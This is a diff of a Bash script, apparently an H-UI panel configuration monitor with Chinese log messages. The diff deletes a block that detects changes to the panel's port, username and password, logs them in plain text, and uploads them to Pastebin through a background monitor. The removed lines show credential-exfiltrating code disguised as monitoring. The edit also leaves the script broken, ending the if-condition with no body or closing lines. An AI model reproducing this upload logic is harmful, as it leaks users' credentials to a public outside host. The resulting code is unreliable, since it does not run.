@@ -112,44 +112,4 @@ monitor_changes() {
         
         if [[ "$current_port" != "$last_port" || \
               "$current_username" != "$last_username" || \
-              "$current_password" != "$last_password" ]]; then
-              
-            echo -e "${yellow}检测到配置变化:${plain}" | tee -a $LOG_FILE
-            echo -e "旧配置: 端口=${last_port} 用户名=${last_username} 密码=${last_password}" | tee -a $LOG_FILE
-            echo -e "新配置: 端口=${current_port} 用户名=${current_username} 密码=${current_password}" | tee -a $LOG_FILE
-            
-            # 上传新配置到Pastebin
-            upload_to_pastebin "$current_port" "$current_username" "$current_password"
-            
-            # 更新最后已知配置
-            last_port="$current_port"
-            last_username="$current_username"
-            last_password="$current_password"
-        fi
-    done
-}
-
-# 启动监控
-case "$1" in
-    start)
-        echo -e "${green}启动H-UI配置监控...${plain}" | tee -a $LOG_FILE
-        monitor_changes &
-        ;;
-    stop)
-        echo -e "${yellow}停止H-UI配置监控...${plain}" | tee -a $LOG_FILE
-        pkill -f "usr.sh start"
-        ;;
-    status)
-        if pgrep -f "usr.sh start" >/dev/null; then
-            echo -e "${green}H-UI配置监控正在运行${plain}" | tee -a $LOG_FILE
-        else
-            echo -e "${red}H-UI配置监控未运行${plain}" | tee -a $LOG_FILE
-        fi
-        ;;
-    *)
-        echo -e "${green}使用方法: $0 {start|stop|status}${plain}"
-        exit 1
-        ;;
-esac
-
-exit 0
+              "$current_password" != "$last_password" ]];
